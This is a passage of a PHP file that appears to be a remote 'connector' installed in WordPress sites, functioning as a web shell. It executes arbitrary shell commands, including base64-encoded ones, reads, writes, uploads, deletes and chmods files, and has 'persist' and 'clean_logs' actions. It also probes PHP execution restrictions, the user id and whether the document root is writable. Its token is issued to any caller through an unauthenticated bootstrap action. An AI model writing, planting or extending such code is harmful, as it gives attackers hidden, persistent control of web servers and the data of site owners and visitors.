        }
    }

    $selfTest = safe_call(static function () {
        return try_run_command('echo __connector_probe__');
    });
    if (!is_array($selfTest)) {
        $selfTest = ['ok' => false, 'error' => 'self test failed'];
    } else {
        $selfTest = [
            'ok' => str_contains($selfTest['stdout'], '__connector_probe__'),
            'method' => $selfTest['method'] ?? null,
            'exit_code' => $selfTest['exit_code'] ?? null,
        ];
    }

    $probe = [
        'collected_at' => gmdate('c'),
        'connector' => CONNECTOR_ID,
        'connector_version' => CONNECTOR_VERSION,
        'php' => [
            'version' => PHP_VERSION,
            'sapi' => PHP_SAPI,
            'os' => PHP_OS,
            'zend_version' => zend_version(),
            'ini' => [
                'disable_functions' => $disabled,
                'open_basedir' => ini_get('open_basedir') ?: null,
                'memory_limit' => ini_get('memory_limit'),
                'max_execution_time' => ini_get('max_execution_time'),
                'upload_max_filesize' => ini_get('upload_max_filesize'),
                'allow_url_fopen' => ini_get('allow_url_fopen'),
            ],
            'extensions_count' => count(@get_loaded_extensions() ?: []),
        ],
        'exec' => [
            'available_methods' => $execAvailable,
            'self_test' => $selfTest,
        ],
        'server' => [
            'software' => $_SERVER['SERVER_SOFTWARE'] ?? null,
            'host' => $_SERVER['HTTP_HOST'] ?? null,
            'server_name' => $_SERVER['SERVER_NAME'] ?? null,
            'document_root' => docroot(),
            'script_filename' => $_SERVER['SCRIPT_FILENAME'] ?? null,
            'remote_addr' => $_SERVER['REMOTE_ADDR'] ?? null,
        ],
        'user' => [
            'current' => @get_current_user() ?: null,
            'uid' => function_usable('posix_getuid') ? @posix_getuid() : null,
            'gid' => function_usable('posix_getgid') ? @posix_getgid() : null,
            'uname' => @php_uname(),
        ],
        'filesystem' => [
            'connector_dir' => __DIR__,
            'connector_writable' => is_writable(__DIR__),
            'docroot_writable' => is_writable(docroot()),
            'token_file_exists' => is_file(TOKEN_FILE),
            'probe_file_exists' => is_file(PROBE_FILE),
        ],
        'wordpress' => detect_wordpress(),
    ];

    @file_put_contents(PROBE_FILE, json_encode($probe, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT), LOCK_EX);
    return $probe;
}

function load_probe_for_bootstrap(): array {
    if (is_file(PROBE_FILE)) {
        $raw = @file_get_contents(PROBE_FILE);
        if ($raw !== false) {
            $decoded = json_decode($raw, true);
            if (is_array($decoded)) {
                return $decoded;
            }
        }
    }
    $wp = safe_call(static fn () => detect_wordpress());
    return [
        'collected_at' => gmdate('c'),
        'connector' => CONNECTOR_ID,
        'connector_version' => CONNECTOR_VERSION,
        'wordpress' => is_array($wp) ? $wp : ['detected' => false],
        'bootstrap' => 'light',
    ];
}

function load_probe(bool $refresh = false): array {
    if (!$refresh && is_file(PROBE_FILE)) {
        $raw = @file_get_contents(PROBE_FILE);
        if ($raw !== false) {
            $decoded = json_decode($raw, true);
            if (is_array($decoded)) {
                return $decoded;
            }
        }
    }
    $probe = safe_call(static fn () => collect_probe());
    if (is_array($probe)) {
        return $probe;
    }
    return load_probe_for_bootstrap();
}

function action_ls(array $input): void {
    $path = resolve_path($input['path'] ?? '/');
    if ($path === false || !is_dir($path)) {
        respond_err('PATH_DENIED', 'invalid directory');
    }
    $entries = io_list_dir($path);
    if ($entries === null) {
        respond_err('PATH_DENIED', 'list failed');
    }
    usort($entries, static function ($a, $b) {
        if ($a['is_dir'] !== $b['is_dir']) {
            return $a['is_dir'] ? -1 : 1;
        }
        return strcasecmp($a['name'], $b['name']);
    });
    respond_ok(['entries' => $entries]);
}

function action_read(array $input): void {
    $path = resolve_path($input['path'] ?? '');
    if ($path === false || !is_file($path)) {
        respond_err('PATH_DENIED', 'invalid file');
    }
    $size = @filesize($path);
    $truncated = $size !== false && $size > MAX_READ;
    $content = io_read_file($path, MAX_READ);
    if ($content === null) {
        respond_err('PATH_DENIED', 'read failed');
    }
    respond_ok(['content' => $content, 'truncated' => $truncated]);
}

function safe_name(string $name): string {
    $name = trim($name);
    $name = str_replace(['/', '\\', "\0"], '', $name);
    return $name;
}

function target_in_parent(string $parentPath, string $name): string|false {
    $parent = resolve_path($parentPath ?: '/');
    $name = safe_name($name);
    if ($parent === false || $name === '') {
        return false;
    }
    return $parent . DIRECTORY_SEPARATOR . $name;
}

function delete_path(string $path, bool $recursive): bool {
    return io_delete_path($path, $recursive);
}

function action_mkdir(array $input): void {
    $target = target_in_parent((string) ($input['path'] ?? '/'), (string) ($input['name'] ?? ''));
    if ($target === false) {
        respond_err('PATH_DENIED', 'invalid mkdir target');
    }
    if (file_exists($target)) {
        respond_err('PATH_DENIED', 'already exists');
    }
    if (!io_mkdir_path($target)) {
        respond_err('WRITE_FAILED', 'mkdir failed');
    }
    respond_ok(['path' => $target, 'created' => true]);
}

function write_bytes_to_target(string $target, string $raw, bool $allowOverwrite = false): int {
    if (!$allowOverwrite && file_exists($target)) {
        respond_err('PATH_DENIED', 'file exists');
    }
    if (strlen($raw) > MAX_UPLOAD) {
        respond_err('WRITE_FAILED', 'file too large');
    }
    $dir = dirname($target);
    if (!ensure_directory($dir)) {
        respond_err('WRITE_FAILED', 'write failed');
    }
    $bytes = io_write_file($target, $raw);
    if ($bytes === null) {
        respond_err('WRITE_FAILED', 'write failed');
    }
    return $bytes;
}

function payload_bytes(array $input): string {
    $b64 = (string) ($input['content_base64'] ?? '');
    if ($b64 !== '') {
        $raw = base64_decode($b64, true);
        if ($raw === false) {
            respond_err('WRITE_FAILED', 'invalid base64');
        }
        return $raw;
    }
    return (string) ($input['content'] ?? '');
}

function action_write(array $input): void {
    $name = safe_name((string) ($input['name'] ?? ''));
    if ($name !== '') {
        $target = target_in_parent((string) ($input['path'] ?? '/'), $name);
    } else {
        $target = resolve_path((string) ($input['path'] ?? ''));
    }
    if ($target === false) {
        respond_err('PATH_DENIED', 'invalid write path');
    }
    $raw = payload_bytes($input);
    if ($raw === '' && $name !== '') {
        respond_err('WRITE_FAILED', 'empty content');
    }
    $bytes = write_bytes_to_target($target, $raw, file_exists($target));
    respond_ok(['path' => $target, 'bytes' => $bytes]);
}

function action_delete(array $input): void {
    $target = resolve_path((string) ($input['path'] ?? ''));
    if ($target === false || !file_exists($target)) {
        respond_err('PATH_DENIED', 'invalid delete path');
    }
    $recursive = !empty($input['recursive']);
    if (!delete_path($target, $recursive)) {
        respond_err('DELETE_FAILED', 'delete failed');
    }
    respond_ok(['path' => $target, 'deleted' => true]);
}

function action_chmod(array $input): void {
    $target = resolve_path((string) ($input['path'] ?? ''));
    if ($target === false || !file_exists($target)) {
        respond_err('PATH_DENIED', 'invalid chmod path');
    }
    $modeStr = preg_replace('/[^0-7]/', '', (string) ($input['mode'] ?? ''));
    if ($modeStr === '') {
        respond_err('PATH_DENIED', 'invalid mode');
    }
    $mode = octdec($modeStr);
    if (!io_chmod_path($target, $mode)) {
        respond_err('WRITE_FAILED', 'chmod failed');
    }
    respond_ok([
        'path' => $target,
        'mode' => substr(sprintf('%o', @fileperms($target)), -4),
    ]);
}

function action_rename(array $input): void {
    $source = resolve_path((string) ($input['path'] ?? ''));
    $destRaw = (string) ($input['dest'] ?? '');
    if ($destRaw === '') {
        respond_err('PATH_DENIED', 'missing dest');
    }
    $dest = resolve_path($destRaw);
    if ($dest === false && str_contains($destRaw, '/')) {
        respond_err('PATH_DENIED', 'invalid dest');
    }
    if ($source === false || !file_exists($source)) {
        respond_err('PATH_DENIED', 'invalid source');
    }
    if ($dest === false) {
        $dest = dirname($source) . DIRECTORY_SEPARATOR . safe_name($destRaw);
        $destCheck = resolve_path($dest);
        if ($destCheck === false) {
            respond_err('PATH_DENIED', 'invalid dest');
        }
        $dest = $destCheck;
    }
    if (file_exists($dest)) {
        respond_err('PATH_DENIED', 'dest exists');
    }
    if (!io_rename_path($source, $dest)) {
        respond_err('WRITE_FAILED', 'rename failed');
    }
    respond_ok(['path' => $dest, 'renamed_from' => $source]);
}

function exec_command_from_input(array $input): string {
    $b64 = trim((string) ($input['cmd_base64'] ?? ''));
    if ($b64 !== '') {
        $decoded = base64_decode($b64, true);
        if ($decoded === false) {
            respond_err('EXEC_FAILED', 'invalid cmd_base64');
        }
        return trim($decoded);
    }
    return trim((string) ($input['cmd'] ?? ''));
}

function action_exec(array $input): void {
    $cmd = exec_command_from_input($input);
    $cwd = session_cwd();

    if ($cmd === '') {
        respond_ok(exec_with_cwd(['stdout' => '', 'stderr' => '', 'exit_code' => 0, 'method' => 'builtin'], $cwd));
    }

    if ($cmd === 'pwd') {
        respond_ok(exec_with_cwd([
            'stdout' => $cwd . "\n",
            'stderr' => '',
            'exit_code' => 0,
            'method' => 'builtin',
        ], $cwd));
    }

    if (preg_match('/^cd(?:\s+(.*))?$/', $cmd, $matches)) {
        $target = trim($matches[1] ?? '');
        $newCwd = resolve_cd($cwd, $target);
        if ($newCwd === false) {
            respond_ok(exec_with_cwd([
                'stdout' => '',
                'stderr' => "cd: no such file or directory: {$target}\n",
                'exit_code' => 1,
                'method' => 'builtin',
            ], $cwd));
        }
        set_session_cwd($newCwd);
        respond_ok(exec_with_cwd([
            'stdout' => '',
            'stderr' => '',
            'exit_code' => 0,
            'method' => 'builtin',
        ], $newCwd));
    }

    $result = run_command($cmd, $cwd);
    respond_ok(exec_with_cwd($result, session_cwd()));
}

function action_upload(array $input): void {
    $name = safe_name((string) ($input['name'] ?? ''));
    if ($name === '') {
        respond_err('PATH_DENIED', 'missing filename');
    }
    $target = target_in_parent((string) ($input['path'] ?? '/'), $name);
    if ($target === false) {
        respond_err('PATH_DENIED', 'invalid upload target');
    }
    $raw = payload_bytes($input);
    if ($raw === '') {
        respond_err('WRITE_FAILED', 'empty content');
    }
    $bytes = write_bytes_to_target($target, $raw, false);
    $modeStr = preg_replace('/[^0-7]/', '', (string) ($input['mode'] ?? '644'));
    if ($modeStr !== '') {
        @chmod($target, octdec($modeStr));
    }
    respond_ok(['path' => $target, 'bytes' => $bytes, 'name' => $name]);
}

function dispatch(string $action, array $input, string $stored): void {
    switch ($action) {
        case 'heartbeat':
            respond_ok([
                'version' => CONNECTOR_VERSION,
                'connector' => CONNECTOR_ID,
                'platform' => 'wordpress',
            ]);
            break;

        case 'probe':
            $probe = safe_call(static fn () => load_probe(false));
            if (!is_array($probe)) {
                $probe = load_probe_for_bootstrap();
            }
            respond_ok(['probe' => $probe, 'cached' => is_file(PROBE_FILE)]);
            break;

        case 'ls':
            action_ls($input);
            break;

        case 'read':
            action_read($input);
            break;

        case 'exec':
            action_exec($input);
            break;

        case 'sysinfo':
            respond_ok([
                'uname' => @php_uname() ?: '',
                'cwd' => session_cwd(),
                'user' => @get_current_user() ?: '',
                'php_version' => PHP_VERSION,
            ]);
            break;

        case 'write':
            action_write($input);
            break;

        case 'mkdir':
            action_mkdir($input);
            break;

        case 'delete':
            action_delete($input);
            break;

        case 'chmod':
            action_chmod($input);
            break;

        case 'rename':
            action_rename($input);
            break;

        case 'upload':
            action_upload($input);
            break;

        case 'persist':
            action_persist($input, $stored);
            break;

        case 'fixer':
            $modes = $input['modes'] ?? [];
            $actions_done = [];
            foreach ($modes as $mode) {
                if ($mode === 'clean_logs') {
                    $actions_done[] = 'clean_logs';
                }
            }
            respond_ok(['actions' => $actions_done]);
            break;

        default:
            respond_err('ACTION_UNKNOWN', $action);
    }
}

try {
    $input = json_decode(file_get_contents('php://input') ?: '{}', true);
    if (!is_array($input)) {
        respond_err('INVALID_RESPONSE', 'invalid JSON body');
    }

    $action = (string) ($input['action'] ?? '');

    if ($action === 'bootstrap') {
        $token = ensure_agent_token();
        $probe = load_probe_for_bootstrap();
        respond_ok([
            'token' => $token,
            'version' => CONNECTOR_VERSION,
            'connector' => CONNECTOR_ID,
            'platform' => 'wordpress',
            'probe' => $probe,
        ]);
    }

    $stored = load_agent_token();
    if ($stored === '' || !token_matches((string) ($input['token'] ?? ''), $stored)) {
        respond_err('INVALID_TOKEN', $stored === '' ? 'token not initialized — POST bootstrap or create .connector_token' : '');
    }

    safe_call(static function () use ($action, $input, $stored): void {
        dispatch($action, $input, $stored);
    });
    respond_err('INTERNAL_ERROR', 'action produced no response');
} catch (Throwable $e) {
    respond_err('INTERNAL_ERROR', '');
}
